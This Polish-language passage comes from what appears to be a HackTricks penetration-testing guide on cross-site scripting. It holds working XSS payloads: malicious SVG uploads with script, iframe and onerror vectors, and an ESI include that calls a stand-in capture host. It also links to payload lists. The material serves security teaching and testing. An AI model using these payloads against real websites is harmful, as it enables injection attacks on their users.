console.log(RegExp.rightContext)
console.log(document.all["0"]["ownerDocument"]["defaultView"]["RegExp"]["rightContext"])
```
### Lista Brute-Force

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss.txt" %}

## Wykorzystywanie innych podatności XSS

### XSS w Markdown

Czy można wstrzyknąć kod Markdown, który zostanie wyrenderowany? Być może można uzyskać XSS! Sprawdź:

{% content-ref url="xss-in-markdown.md" %}
[xss-in-markdown.md](xss-in-markdown.md)
{% endcontent-ref %}

### XSS do SSRF

Masz XSS na **stronie, która używa pamięci podręcznej**? Spróbuj **uaktualnić to do SSRF** poprzez wstrzyknięcie kodu Edge Side Include z tym payloadem:
```python
<esi:include src="http://yoursite.com/capture" />
```
Użyj go do omijania ograniczeń plików cookie, filtrów XSS i wiele więcej!\
Więcej informacji na temat tej techniki znajdziesz tutaj: [**XSLT**](../xslt-server-side-injection-extensible-stylesheet-language-transformations.md).

### XSS w dynamicznie tworzonym pliku PDF

Jeśli strona internetowa tworzy plik PDF przy użyciu kontrolowanego przez użytkownika wejścia, możesz spróbować **oszukać bota**, który tworzy PDF, aby **wykonał dowolny kod JS**.\
Jeśli **bot tworzący PDF znajdzie** pewnego rodzaju **tagi HTML**, będzie je **interpretował**, a ty możesz **wykorzystać** to zachowanie, aby spowodować **Server XSS**.

{% content-ref url="server-side-xss-dynamic-pdf.md" %}
[server-side-xss-dynamic-pdf.md](server-side-xss-dynamic-pdf.md)
{% endcontent-ref %}

Jeśli nie możesz wstrzyknąć tagów HTML, warto spróbować **wstrzyknąć dane PDF**:

{% content-ref url="pdf-injection.md" %}
[pdf-injection.md](pdf-injection.md)
{% endcontent-ref %}

### XSS w Amp4Email

AMP, mający na celu przyspieszenie wydajności strony internetowej na urządzeniach mobilnych, wykorzystuje tagi HTML uzupełnione przez JavaScript, aby zapewnić funkcjonalność z naciskiem na szybkość i bezpieczeństwo. Obsługuje wiele komponentów do różnych funkcji, dostępnych za pośrednictwem [komponentów AMP](https://amp.dev/documentation/components/?format=websites).

Format [**AMP dla wiadomości e-mail**](https://amp.dev/documentation/guides-and-tutorials/learn/email-spec/amp-email-format/) rozszerza konkretne komponenty AMP na wiadomości e-mail, umożliwiając odbiorcom interakcję z treścią bezpośrednio w swoich wiadomościach e-mail.

Przykład [**opisu XSS w Amp4Email w Gmailu**](https://adico.me/post/xss-in-gmail-s-amp4email).

### XSS przesyłanie plików (svg)

Prześlij jako obraz plik o następującej zawartości (ze strony [http://ghostlulz.com/xss-svg/](http://ghostlulz.com/xss-svg/)):
```markup
Content-Type: multipart/form-data; boundary=---------------------------232181429808
Content-Length: 574
-----------------------------232181429808
Content-Disposition: form-data; name="img"; filename="img.svg"
Content-Type: image/svg+xml

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
<script type="text/javascript">
alert(1);
</script>
</svg>
-----------------------------232181429808--
```

```markup
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<script type="text/javascript">alert("XSS")</script>
</svg>
```

```markup
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert("XSS");
</script>
</svg>
```

```svg
<svg width="500" height="500"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<circle cx="50" cy="50" r="45" fill="green"
id="foo"/>

<foreignObject width="500" height="500">
<iframe xmlns="http://www.w3.org/1999/xhtml" src="data:text/html,&lt;body&gt;&lt;script&gt;document.body.style.background=&quot;red&quot;&lt;/script&gt;hi&lt;/body&gt;" width="400" height="250"/>
<iframe xmlns="http://www.w3.org/1999/xhtml" src="javascript:document.write('hi');" width="400" height="250"/>
</foreignObject>
</svg>
```

```html
<svg><use href="//portswigger-labs.net/use_element/upload.php#x"/></svg>
```

```xml
<svg><use href="data:image/svg+xml,&lt;svg id='x' xmlns='http://www.w3.org/2000/svg' &gt;&lt;image href='1' onerror='alert(1)' /&gt;&lt;/svg&gt;#x" />
```
Znajdź **więcej ładunków SVG** w [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)

## Inne sztuczki JS i istotne informacje

{% content-ref url="other-js-tricks.md" %}
[other-js-tricks.md](other-js-tricks.md)
{% endcontent-ref %}

## Zasoby dotyczące XSS

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
* [http://www.xss-payloads.com](http://www.xss-payloads.com) [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt) [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
* [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
* [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)


<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Wskazówka dotycząca bug bounty**: **zarejestruj się** na platformie **Intigriti**, premium **platformie bug bounty stworzonej przez hakerów, dla hakerów**! Dołącz do nas na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) już dziś i zacznij zarabiać nagrody do **100 000 USD**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
